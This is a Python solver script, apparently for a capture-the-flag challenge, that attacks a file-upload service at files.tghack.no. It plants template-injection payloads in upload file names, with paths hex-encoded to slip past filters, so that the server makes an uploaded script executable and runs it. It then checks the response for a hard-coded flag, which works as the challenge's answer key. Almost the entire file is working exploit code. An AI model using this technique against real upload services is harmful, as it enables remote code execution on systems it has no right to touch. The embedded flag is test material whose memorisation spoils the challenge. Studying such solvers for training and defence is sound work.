#!/usr/bin/env python3
import sys
import requests
import io

def create_bytes(data):
    str_hex_raw = ("," + data.hex(","))
    str_hex = str_hex_raw.replace(",", ",0x").strip(",")
    return "bytes([" + str_hex + "])"

def create_string(text):
    data = bytes(text, "utf-8")
    return "str(" + create_bytes(data) + ",sys.stdout.encoding)"

perm_name = "{% import os,sys,stat %}{{ os.chmod(" + create_string("/uploads/p.py") + ",stat.S_IRWXU) }}"
swap_name = "{% import os,sys %}{{ os.execl(" + create_string("/uploads/p.py") + "," + create_string("/uploads/p.py") + ") }}"

def post_file(name, endpoint, payload):
    with io.BytesIO(payload) as f:
        with requests.post(endpoint, files={name: (name, f)}) as r:
            print("Status code {}".format(r.status_code))

def get_redirect(endpoint):
    with requests.get(endpoint) as r:
        return r.url

def run_test(payload):
    base_endpoint = ""

    if len(sys.argv) == 1:
        base_endpoint = "https://files.tghack.no"
    elif len(sys.argv) == 2:
        base_endpoint = sys.argv[1]

    if len(base_endpoint) == 0:
        print(sys.argv[0] + " <endpoint>")
    else:
        current_endpoint = get_redirect(base_endpoint)
        post_file("p.py", current_endpoint, payload)
        post_file(perm_name, current_endpoint, payload)
        post_file(swap_name, current_endpoint, payload)
        requests.get(current_endpoint)
        resp_text = requests.get(current_endpoint).text
    assert "TG20{skilled_statistic_unhappily_icing}" in resp_text

def solver_entry(payload):
    try:
        run_test(payload)
    except (OSError, AssertionError, NameError):
        sys.exit(102)
    else:
        sys.exit(101)
